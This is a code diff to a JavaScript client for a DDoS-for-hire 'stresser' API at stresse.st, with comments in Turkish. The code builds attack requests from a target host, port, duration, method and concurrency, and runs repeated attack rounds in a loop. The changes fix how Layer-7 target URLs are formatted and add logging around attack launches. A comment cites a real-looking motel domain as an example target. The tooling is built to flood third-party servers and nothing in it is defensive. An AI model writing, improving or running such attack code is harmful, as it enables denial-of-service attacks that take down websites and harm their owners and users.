@@ -309,18 +309,34 @@ function buildApiUrl(apiToken, params) {
   } else if (isL7 && host.startsWith('http://')) {
     host = host.replace('http://', '');
   }
+  // L7 URL'lerde trailing slash API'de istenmez (ornegin badlandsmotel.ca/ hatali olur)
+  if (isL7) {
+    host = host.replace(/\/$/, '');
+  }
   // L7 geo suffix .txt olmali
   const geo = isL7 ? `${params.geo || 'russia'}.txt` : (params.geo || 'russia');
-  return `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(params.method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
+  const url = `https://stresse.st/api?key=${encodeURIComponent(apiToken)}&host=${encodeURIComponent(host)}&port=${params.port}&time=${params.time}&method=${encodeURIComponent(params.method)}&conc=${params.concurrents || 1}&geo=${encodeURIComponent(geo)}`;
+  console.log(`[buildApiUrl] layer=${params.layer || 'L4'} host=${host} url=${url}`);
+  return url;
 }
 
 async function startAttackApi(apiClient, params) {
   const url = buildApiUrl(params.apiToken, params);
-  const res = await apiClient.get(url);
-  if (res.data?.status === 'error') {
-    throw new Error(res.data.message || 'API attack failed');
+  try {
+    const res = await apiClient.get(url);
+    console.log(`[startAttackApi] status=${res.status} data=${JSON.stringify(res.data).slice(0, 400)}`);
+    if (res.data?.status === 'error') {
+      throw new Error(res.data.message || 'API attack failed');
+    }
+    return res.data;
+  } catch (err) {
+    if (err.response) {
+      console.error(`[startAttackApi] HTTP ${err.response.status} error:`, JSON.stringify(err.response.data).slice(0, 400));
+    } else {
+      console.error(`[startAttackApi] request error:`, err.message);
+    }
+    throw err;
   }
-  return res.data;
 }
 
 async function stopAttackApi(apiClient, apiToken, attackId) {
@@ -1087,6 +1103,16 @@ async function runLoopRound(loopId) {
     saveState();
     return;
   }
+
+  console.log(`[loop ${loopId}] round baslatiliyor:`, JSON.stringify({
+    host: loop.params.host,
+    port: loop.params.port,
+    method: loop.params.method,
+    time: loop.params.time,
+    layer: loop.params.layer,
+    concurrents: loop.params.concurrents,
+    hasApiToken: !!session.apiToken
+  }));
 
   const apiClient = getApiClient(loop.sessionId);
 
